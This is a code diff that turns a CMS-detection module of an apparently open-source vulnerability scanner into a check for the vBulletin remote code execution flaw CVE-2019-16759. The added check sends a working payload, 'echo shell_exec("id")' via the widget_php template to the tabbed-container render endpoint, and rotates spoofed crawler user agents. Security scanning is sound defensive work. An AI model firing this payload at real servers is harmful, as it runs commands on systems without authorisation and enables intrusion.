@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Author: Aman Gupta , github.com/aman566
+# Author: Aman Gupta github.com/aman566
+# https://www.zdnet.com/article/security-researcher-publishes-details-and-exploit-code-for-a-vbulletin-zero-day/
 
 import socket
 import socks
@@ -14,28 +15,21 @@ import struct
 import re
 import os
 from OpenSSL import crypto
-import logging
 import ssl
 from core.alert import *
 from core.targets import target_type
+import logging
 from core.targets import target_to_host
 from core.load_modules import load_file_path
 from lib.socks_resolver.engine import getaddrinfo
 from core._time import now
 from core.log import __log_into_file
 import requests
-from six import text_type
 
 
 def extra_requirements_dict():
-    return {
-        "whatcms_ports": [443],
-        "whatcms_api_key": ["test_api_key"],
-    }
+    return {"vbulletin_cve_2019_16759_vuln_ports": [443, 80]}
 
-CHECK = 0
-SESSION = requests.Session()
-CMS_CODES = [0, 102, 123, 201, 202, 203, 204]
 
 def conn(targ, port, timeout_sec, socks_proxy):
     try:
@@ -73,7 +67,7 @@ def conn(targ, port, timeout_sec, socks_proxy):
         return None
 
 
-def whatcms(
+def vbulletin_vuln(
     target,
     port,
     timeout_sec,
@@ -84,82 +78,80 @@ def whatcms(
     socks_proxy,
     scan_id,
     scan_cmd,
-    whatcms_api_key,
 ):
     try:
-        try:
-            s = conn(target, port, timeout_sec, socks_proxy)
-        except Exception:
-            return False
+        s = conn(target_to_host(target), port, timeout_sec, socks_proxy)
         if not s:
             return False
         else:
-            global cms_name
+            if (
+                target_type(target) != "HTTP"
+                and port in extra_requirements_dict()["vbulletin_cve_2019_16759_vuln_ports"]
+            ):
+                target = "https://" + target
+            user_agent = [
+                "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060719 Firefox/1.5.0.5",
+                "Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
+                "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Ubuntu/10.04"
+                " Chromium/9.0.595.0 Chrome/9.0.595.0 Safari/534.13",
+                "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
+                "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
+                "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620",
+                "Debian APT-HTTP/1.3 (0.8.10.3)",
+                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+                "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
+                "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+                "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; "
+                "http://help.yahoo.com/help/us/shop/merchant/)",
+                "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+                "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+                "msnbot/1.1 (+http://search.msn.com/msnbot.htm)",
+            ]
             headers = {
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0",
+                "User-Agent": random.choice(user_agent),
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                 "Accept-Language": "en-US,en;q=0.7,ru;q=0.3",
-                "Accept-Encoding": "gzip, deflate",
-                "Connection": "Keep-Alive",
-                "Upgrade-Insecure-Requests": "1",
-                "X-Requested-With": "XMLHttpRequest",
+                "Connection": "keep-alive",
             }
-            check_api_key_is_valid = (
-                "https://whatcms.org/API/Status?key=" + whatcms_api_key
-            )
-            global CHECK
-            if CHECK == 0:
-                check = SESSION.get(
-                    check_api_key_is_valid, headers=headers, verify=False, timeout=timeout_sec
-                )
-                api_result_code = json.loads(check.text)["result"]["code"]
-                if api_result_code == 101:
-                    warn(
-                        messages(language, "Invalid_whatcms_api_key").format(
-                            "Invalid API Key"
-                        )
-                    )
-                    return
-                CHECK = 1
-            info(messages(language, "searching_whatcms_database").format(target))
-            requests_url = (
-                "https://whatcms.org/API/CMS?key=" + whatcms_api_key + "&url=" + target
-            )
-            while 1:
+            while True:
                 try:
-                    req = SESSION.get(requests_url, verify=False, headers=headers, timeout=timeout_sec)
-                    cms_name = json.loads(req.text)["result"]["name"]
-                    cms_version = json.loads(req.text)["result"]["version"]
-                    status_codes = json.loads(req.text)["result"]["code"]
-                    if status_codes == 200:
-                        if cms_version:
-                            cms_name += " version " + cms_version
-                        return cms_name
-                    elif status_codes == 121:
-                        warn(messages(language, "whatcms_monthly_quota_exceeded"))
-                        return
-                    elif status_codes in CMS_CODES:
-                        return
-                except requests.exceptions.Timeout:
-                    time.sleep(5)
+                    params = {
+                        "subWidgets[0][template]": "widget_php",
+                        "subWidgets[0][config][code]": 'echo shell_exec("id"); exit;',
+                    }
+                    if target.endswith("/"):
+                        target = target[:-1]
+                    r = requests.post(
+                        url=target + "/ajax/render/widget_tabbedcontainer_tab_panel",
+                        data=params,
+                        verify=False,
+                        headers=headers,
+                        timeout=timeout_sec,
+                    )
+                    if r.status_code == 200 and "gid" in r.text.lower():
+                        return True
+                    else:
+                        return False
+                except Exception:
+                    return False
     except Exception:
         return False
 
 
-def __whatcms(
+def __vbulletin_vuln(
     target,
     port,
     timeout_sec,
     log_in_file,
     language,
+    verbose_level,
     time_sleep,
     thread_tmp_filename,
     socks_proxy,
     scan_id,
     scan_cmd,
-    whatcms_api_key,
 ):
-    if whatcms(
+    if vbulletin_vuln(
         target,
         port,
         timeout_sec,
@@ -170,9 +162,12 @@ def __whatcms(
         socks_proxy,
         scan_id,
         scan_cmd,
-        whatcms_api_key,
     ):
-        info(messages(language, "found").format(target, "CMS Name", cms_name))
+        info(
+            messages(language, "target_vulnerable").format(
+                target, port, "vBulletin RCE CVE-2019-16759 Vulnerability"
+            )
+        )
         __log_into_file(thread_tmp_filename, "w", "0", language)
         data = json.dumps(
             {
@@ -180,12 +175,12 @@ def __whatcms(
                 "USERNAME": "",
                 "PASSWORD": "",
                 "PORT": port,
-                "TYPE": "whatcms_scan",
-                "DESCRIPTION": messages(language, "found").format(
-                    target, "CMS Name", cms_name
+                "TYPE": "vbulletin_cve_2019_16759_vuln",
+                "DESCRIPTION": messages(language, "vulnerable").format(
+                    "vbulletin_cve_2019_16759_vuln"
                 ),
                 "TIME": now(),
-                "CATEGORY": "scan",
+                "CATEGORY": "vuln",
                 "SCAN_ID": scan_id,
                 "SCAN_CMD": scan_cmd,
             }
@@ -230,9 +225,7 @@ def start(
                     ]
         extra_requirements = new_extra_requirements
         if ports is None:
-            ports = extra_requirements["whatcms_ports"]
-        if target_type(target) == "HTTP":
-            target = target_to_host(target)
+            ports = extra_requirements["vbulletin_cve_2019_16759_vuln_ports"]
         threads = []
         total_req = len(ports)
         thread_tmp_filename = "{}/tmp/thread_tmp_".format(load_file_path()) + "".join(
@@ -241,22 +234,23 @@ def start(
         __log_into_file(thread_tmp_filename, "w", "1", language)
         trying = 0
         keyboard_interrupt_flag = False
+
         for port in ports:
             port = int(port)
             t = threading.Thread(
-                target=__whatcms,
+                target=__vbulletin_vuln,
                 args=(
                     target,
                     int(port),
                     timeout_sec,
                     log_in_file,
                     language,
+                    verbose_level,
                     time_sleep,
                     thread_tmp_filename,
                     socks_proxy,
                     scan_id,
                     scan_cmd,
-                    extra_requirements["whatcms_api_key"][0],
                 ),
             )
             threads.append(t)
@@ -265,7 +259,13 @@ def start(
             if verbose_level > 3:
                 info(
                     messages(language, "trying_message").format(
-                        trying, total_req, num, total, target, port, "whatcms_scan",
+                        trying,
+                        total_req,
+                        num,
+                        total,
+                        target,
+                        port,
+                        "vbulletin_cve_2019_16759_vuln",
                     )
                 )
             while 1:
@@ -281,7 +281,6 @@ def start(
                 break
         # wait for threads
         kill_switch = 0
-        kill_time = int(timeout_sec / 0.1) if int(timeout_sec / 0.1) != 0 else 1
         while 1:
             time.sleep(0.1)
             kill_switch += 1
@@ -292,15 +291,21 @@ def start(
                 break
         thread_write = int(open(thread_tmp_filename).read().rsplit()[0])
         if thread_write == 1 and verbose_level != 0:
-            info(messages(language, "not_found"))
+            info(
+                messages(language, "no_vulnerability_found").format(
+                    "vbulletin_cve_2019_16759_vuln not found"
+                )
+            )
             data = json.dumps(
                 {
                     "HOST": target,
                     "USERNAME": "",
                     "PASSWORD": "",
                     "PORT": "",
-                    "TYPE": "whatcms_scan",
-                    "DESCRIPTION": messages(language, "not_found"),
+                    "TYPE": "vbulletin_cve_2019_16759_vuln",
+                    "DESCRIPTION": messages(language, "no_vulnerability_found").format(
+                        "vbulletin_cve_2019_16759_vuln not found"
+                    ),
                     "TIME": now(),
                     "CATEGORY": "scan",
                     "SCAN_ID": scan_id,
@@ -311,4 +316,8 @@ def start(
         os.remove(thread_tmp_filename)
 
     else:
-        warn(messages(language, "input_target_error").format("whatcms_scan", target))
+        warn(
+            messages(language, "input_target_error").format(
+                "vbulletin_cve_2019_16759_vuln", target
+            )
+        )
